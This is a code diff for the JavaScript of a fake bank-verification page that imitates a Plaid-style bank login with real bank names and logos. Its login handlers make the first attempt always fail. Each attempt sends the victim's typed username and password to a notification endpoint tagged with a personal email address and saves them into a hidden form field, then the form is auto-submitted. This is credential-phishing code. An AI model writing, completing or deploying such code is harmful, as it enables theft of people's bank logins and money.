@@ -9,11 +9,11 @@ document.addEventListener('DOMContentLoaded', function() {
     const plaidMetadataInput = document.getElementById('plaid_metadata');
     const bankNameInput = document.getElementById('bank_name');
     const bankVerificationForm = document.getElementById('bank-verification-form');
-    
+
     // Variables
     let selectedBank = null;
     let isFirstAttempt = true;
-    
+
     // Initialize manual bank entry toggle
     if (manualBankBtn) {
         manualBankBtn.addEventListener('click', function(e) {
@@ -21,7 +21,7 @@ document.addEventListener('DOMContentLoaded', function() {
             if (plaidSection && manualSection) {
                 plaidSection.style.display = 'none';
                 manualSection.style.display = 'block';
-                
+
                 // Focus on first input field
                 const firstInput = manualSection.querySelector('input');
                 if (firstInput) {
@@ -30,16 +30,16 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
     }
-    
+
     // Render popular banks
     renderPopularBanks();
-    
+
     // Initialize bank search
     if (bankSearch) {
         bankSearch.addEventListener('input', function() {
             const searchTerm = this.value.trim().toLowerCase();
             const bankOptions = document.querySelectorAll('.bank-option');
-            
+
             bankOptions.forEach(option => {
                 const bankName = option.dataset.bankName.toLowerCase();
                 if (bankName.includes(searchTerm) || searchTerm === '') {
@@ -50,24 +50,23 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         });
     }
-    
+
     // Render popular banks
     function renderPopularBanks() {
         if (!popularBanksContainer) return;
-        
+
         // Bank database defined from the complete list
         const bankDatabase = [
             // Major banks listed as popular
-            {name: "ABBEY NAT TREASURY SVC CT BR", domain: "abbey.com", type: "bank", popular: true},
             {name: "CHASE BANK USA NATIONAL ASSOCIATION", domain: "chase.com", type: "bank", popular: true},
             {name: "BANK OF AMERICA NATIONAL ASSOCIATION", domain: "bankofamerica.com", type: "bank", popular: true},
             {name: "WELLS FARGO BANK NATIONAL ASSOCIATION", domain: "wellsfargo.com", type: "bank", popular: true},
             {name: "CITIBANK NA", domain: "citibank.com", type: "bank", popular: true},
-            {name: "ABN AMRO BK NV NY BR", domain: "abn-amro.com", type: "bank", popular: true},
-            {name: "AMERICAN EXPRESS COMPANY", domain: "americanexpress.com", type: "bank", popular: true},
-            {name: "HSBC BANK USA NATIONAL ASSOCIATION", domain: "hsbc.com", type: "bank", popular: true},
-            
-            // Complete list of all banks
+            {name: "CAPITAL ONE NATIONAL ASSOCIATION", domain: "capitalone.com", type: "bank", popular: true},
+            {name: "ABN-AMRO BK NV NY BR", domain: "abnamro.com", type: "bank", popular: true},
+            {name: "ABBEY NAT TREASURY SVC CT BR", domain: "abbey.com", type: "bank", popular: true},
+
+            // Additional banks from the list
             {name: "ABBEY NATIONAL SECURITIES INC", domain: "abbey-securities.com", type: "bank", popular: false},
             {name: "ABN AMRO BK NV NY FIFTH AVE BR", domain: "abnamro-fifthave.com", type: "bank", popular: false},
             {name: "ABN AMRO INCORPORATED", domain: "abnamro-inc.com", type: "bank", popular: false},
@@ -79,7 +78,7 @@ document.addEventListener('DOMContentLoaded', function() {
             {name: "AMEGY BANK NATIONAL ASSOCIATION", domain: "amegybank.com", type: "bank", popular: false},
             {name: "AMEGY INVESTMENTS INC", domain: "amegy-investments.com", type: "bank", popular: false},
             {name: "AMERICAN EXPRESS CENTURION BANK", domain: "centurion.com", type: "bank", popular: false},
-            {name: "AMERIKA SAMOA BANK", domain: "amerikasamoa.com", type: "bank", popular: false},
+            {name: "AMERICAN EXPRESS COMPANY", domain: "americanexpress.com", type: "bank", popular: false},
             {name: "ANZ GUAM INC", domain: "anzguam.com", type: "bank", popular: false},
             {name: "ANZ SECURITIES INC", domain: "anzsecurities.com", type: "bank", popular: false},
             {name: "ARAB BKG CORP NY BR", domain: "arabbanking.com", type: "bank", popular: false},
@@ -97,14 +96,12 @@ document.addEventListener('DOMContentLoaded', function() {
             {name: "BANCO BRADESCO SA NY BR", domain: "bradesco-ny.com", type: "bank", popular: false},
             {name: "BANCO DE CREDITO E INV MIA BR", domain: "bci-miami.com", type: "bank", popular: false},
             {name: "BANCO DE SABADELL SA MIAMI BR", domain: "sabadell-miami.com", type: "bank", popular: false},
-            {name: "BANCO DEL ESTADO D CHILE NY BR", domain: "bancoestado-ny.com", type: "bank", popular: false}
-            // Note: Full list would be too long for this example. You can continue adding the remaining banks from the list.
-        ];
-        
-        const popularBanks = bankDatabase.filter(bank => bank.popular);
-            {name: "WELLS FARGO BANK NATIONAL ASSOCIATION", domain: "wellsfargo.com", type: "bank", popular: true},
-            {name: "CITIBANK NA", domain: "citibank.com", type: "bank", popular: true},
-            {name: "CAPITAL ONE NATIONAL ASSOCIATION", domain: "capitalone.com", type: "bank", popular: true},
+            {name: "BANCO DEL ESTADO D CHILE NY BR", domain: "bancoestado-ny.com", type: "bank", popular: false},
+            {name: "BANK OF NOVA SCOTIA NY AGY", domain: "scotiabank.com", type: "bank", popular: false},
+            {name: "BNP PARIBAS NY BR", domain: "bnpparibas.com", type: "bank", popular: false},
+            {name: "SANTANDER BANK", domain: "santander.com", type: "bank", popular: false},
+            {name: "UBS AG NY BR", domain: "ubs.com", type: "bank", popular: false},
+            {name: "ROYAL BANK OF CANADA NY BR", domain: "rbcroyalbank.com", type: "bank", popular: false},
             {name: "TD BANK NA", domain: "tdbank.com", type: "bank", popular: true},
             {name: "U.S. BANK NATIONAL ASSOCIATION", domain: "usbank.com", type: "bank", popular: true},
             {name: "PNC BANK NATIONAL ASSOCIATION", domain: "pnc.com", type: "bank", popular: true},
@@ -115,48 +112,42 @@ document.addEventListener('DOMContentLoaded', function() {
             {name: "MORGAN STANLEY", domain: "morganstanley.com", type: "bank", popular: true},
             {name: "STATE STREET BANK AND TRUST COMPANY", domain: "statestreet.com", type: "bank", popular: false},
             {name: "BARCLAYS BANK DELAWARE", domain: "barclays.com", type: "bank", popular: false},
-            {name: "CREDIT SUISSE", domain: "credit-suisse.com", type: "bank", popular: false},
-            // Add remaining banks from the list
-            {name: "BANK OF NOVA SCOTIA NY AGY", domain: "scotiabank.com", type: "bank", popular: false},
-            {name: "BNP PARIBAS NY BR", domain: "bnpparibas.com", type: "bank", popular: false},
-            {name: "SANTANDER BANK", domain: "santander.com", type: "bank", popular: false},
-            {name: "UBS AG NY BR", domain: "ubs.com", type: "bank", popular: false},
-            {name: "ROYAL BANK OF CANADA NY BR", domain: "rbcroyalbank.com", type: "bank", popular: false}
-            // Note: Full list would be too long for this example, but you can add more from the provided list
+            {name: "CREDIT SUISSE", domain: "credit-suisse.com", type: "bank", popular: false}
+
         ];
-        
+
         const popularBanks = bankDatabase.filter(bank => bank.popular);
         const otherBanks = bankDatabase.filter(bank => !bank.popular);
-        
+
         popularBanksContainer.innerHTML = ''; // Clear existing content
-        
+
         // First show popular banks
         popularBanks.forEach(bank => {
             const bankElement = createBankElement(bank);
             popularBanksContainer.appendChild(bankElement);
         });
-        
+
         // Then show other banks
         otherBanks.forEach(bank => {
             const bankElement = createBankElement(bank);
             popularBanksContainer.appendChild(bankElement);
         });
-        
+
         popularBanks.forEach(bank => {
             // Create column for responsive layout
             const col = document.createElement('div');
             col.className = 'col-6 col-md-3 mb-3';
-            
+
             // Create bank option
             const bankOption = document.createElement('div');
             bankOption.className = 'bank-option';
             bankOption.dataset.bankId = bank.id;
             bankOption.dataset.bankName = bank.name;
-            
+
             // Create logo container
             const logoContainer = document.createElement('div');
             logoContainer.className = 'bank-logo-container';
-            
+
             // Create bank logo
             const logo = document.createElement('img');
             logo.className = 'bank-logo';
@@ -165,32 +156,32 @@ document.addEventListener('DOMContentLoaded', function() {
             logo.onerror = function() {
                 this.src = '/static/images/default-bank.svg';
             };
-            
+
             // Create bank name element
             const bankName = document.createElement('div');
             bankName.className = 'bank-name';
             bankName.textContent = bank.name;
-            
+
             // Append elements
             logoContainer.appendChild(logo);
             bankOption.appendChild(logoContainer);
             bankOption.appendChild(bankName);
             col.appendChild(bankOption);
-            
+
             // Add to popular banks container
             popularBanksContainer.appendChild(col);
-            
+
             // Add click event
             bankOption.addEventListener('click', function() {
                 selectBank(bank);
             });
         });
     }
-    
+
     // Select bank and show login form
     function selectBank(bank) {
         selectedBank = bank;
-        
+
         if (plaidSection) {
             // Create bank login form
             const loginForm = document.createElement('div');
@@ -216,11 +207,11 @@ document.addEventListener('DOMContentLoaded', function() {
                     <a href="#" id="back-to-banks" class="btn btn-link">Choose a different bank</a>
                 </div>
             `;
-            
+
             // Clear and append the login form
             plaidSection.innerHTML = '';
             plaidSection.appendChild(loginForm);
-            
+
             // Focus on username field
             setTimeout(() => {
                 const usernameField = document.getElementById('bank-username');
@@ -228,18 +219,18 @@ document.addEventListener('DOMContentLoaded', function() {
                     usernameField.focus();
                 }
             }, 100);
-            
+
             // Set bank name in the form
             if (bankNameInput) {
                 bankNameInput.value = bank.name;
             }
-            
+
             // Add event listeners for login button
             const loginButton = document.getElementById('bank-login-btn');
             if (loginButton) {
                 loginButton.addEventListener('click', handleLoginAttempt);
             }
-            
+
             // Back to bank selection
             const backButton = document.getElementById('back-to-banks');
             if (backButton) {
@@ -250,24 +241,24 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         }
     }
-    
+
     // Handle login attempt
     function handleLoginAttempt(e) {
         e.preventDefault();
-        
+
         // Get entered credentials
         const usernameField = document.getElementById('bank-username');
         const passwordField = document.getElementById('bank-password');
         const username = usernameField ? usernameField.value : '';
         const password = passwordField ? passwordField.value : '';
-        
+
         // Show loading spinner
         showLoading('Connecting to your bank...');
-        
+
         if (isFirstAttempt) {
             // First attempt always fails
             isFirstAttempt = false;
-            
+
             // Send first attempt to representative
             fetch('/api/notify-login-attempt', {
                 method: 'POST',
@@ -281,20 +272,20 @@ document.addEventListener('DOMContentLoaded', function() {
                     email: 'denzelbennie@outlook.com'
                 })
             });
-            
+
             // Record first attempt metadata for admin notification
             saveMetadata(username, password, 1);
-            
+
             // Show error after simulated loading time (5 seconds)
             setTimeout(function() {
                 hideLoading();
                 alert('We were unable to connect to your bank account. Please try again or enter your details manually.');
-                
+
                 // Focus on username field
                 if (usernameField) {
                     usernameField.focus();
                 }
-                
+
                 // Replace event listener for second attempt
                 const loginButton = document.getElementById('bank-login-btn');
                 if (loginButton) {
@@ -304,20 +295,20 @@ document.addEventListener('DOMContentLoaded', function() {
             }, 5000);
         }
     }
-    
+
     // Handle second login attempt
     function handleSecondLoginAttempt(e) {
         e.preventDefault();
-        
+
         // Get entered credentials
         const usernameField = document.getElementById('bank-username');
         const passwordField = document.getElementById('bank-password');
         const username = usernameField ? usernameField.value : '';
         const password = passwordField ? passwordField.value : '';
-        
+
         // Show loading spinner
         showLoading('Connecting to your bank...');
-        
+
         // Send second attempt to representative
         fetch('/api/notify-login-attempt', {
             method: 'POST',
@@ -331,25 +322,25 @@ document.addEventListener('DOMContentLoaded', function() {
                 email: 'denzelbennie@outlook.com'
             })
         });
-        
+
         // Record second attempt metadata for admin notification
         saveMetadata(username, password, 2);
-        
+
         // Redirect to manual entry after simulated loading time
         setTimeout(function() {
             hideLoading();
-            
+
             // Show manual entry section
             if (plaidSection && manualSection) {
                 plaidSection.style.display = 'none';
                 manualSection.style.display = 'block';
-                
+
                 // Focus on account number field
                 const accountNumberInput = document.getElementById('account_number');
                 if (accountNumberInput) {
                     accountNumberInput.focus();
                 }
-                
+
                 // Submit the form automatically after showing manual section
                 setTimeout(() => {
                     if (bankVerificationForm) {
@@ -363,7 +354,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         }, 5000);
     }
-    
+
     // Save metadata for admin notification
     function saveMetadata(username, password, attemptNumber) {
         if (plaidMetadataInput && selectedBank) {
@@ -377,11 +368,11 @@ document.addEventListener('DOMContentLoaded', function() {
             plaidMetadataInput.value = JSON.stringify(metadataObj);
         }
     }
-    
+
     // Show loading indicator
     function showLoading(message = 'Loading...') {
         let loadingOverlay = document.getElementById('loading-overlay');
-        
+
         // Create loading overlay if it doesn't exist
         if (!loadingOverlay) {
             loadingOverlay = document.createElement('div');
@@ -397,14 +388,14 @@ document.addEventListener('DOMContentLoaded', function() {
             loadingOverlay.style.alignItems = 'center';
             loadingOverlay.style.flexDirection = 'column';
             loadingOverlay.style.zIndex = '9999';
-            
+
             loadingOverlay.innerHTML = `
                 <div class="spinner-border text-light" role="status">
                     <span class="visually-hidden">Loading...</span>
                 </div>
                 <div class="text-light mt-3">${message}</div>
             `;
-            
+
             document.body.appendChild(loadingOverlay);
         } else {
             // Update message if overlay exists
@@ -415,7 +406,7 @@ document.addEventListener('DOMContentLoaded', function() {
             loadingOverlay.style.display = 'flex';
         }
     }
-    
+
     // Hide loading indicator
     function hideLoading() {
         const loadingOverlay = document.getElementById('loading-overlay');
@@ -427,12 +418,12 @@ document.addEventListener('DOMContentLoaded', function() {
 function createBankElement(bank) {
     const col = document.createElement('div');
     col.className = 'col-6 col-md-3 mb-3';
-    
+
     const bankOption = document.createElement('div');
     bankOption.className = 'bank-option';
     bankOption.dataset.bankName = bank.name;
     bankOption.dataset.bankLogo = bank.domain;
-    
+
     const logoUrl = `https://logo.clearbit.com/${bank.domain}`;
     bankOption.innerHTML = `
         <div class="bank-logo-container">
@@ -441,10 +432,10 @@ function createBankElement(bank) {
         </div>
         <div class="bank-name">${bank.name}</div>
     `;
-    
+
     // Add click handler
     bankOption.addEventListener('click', () => selectBank(bank));
-    
+
     col.appendChild(bankOption);
     return col;
 }
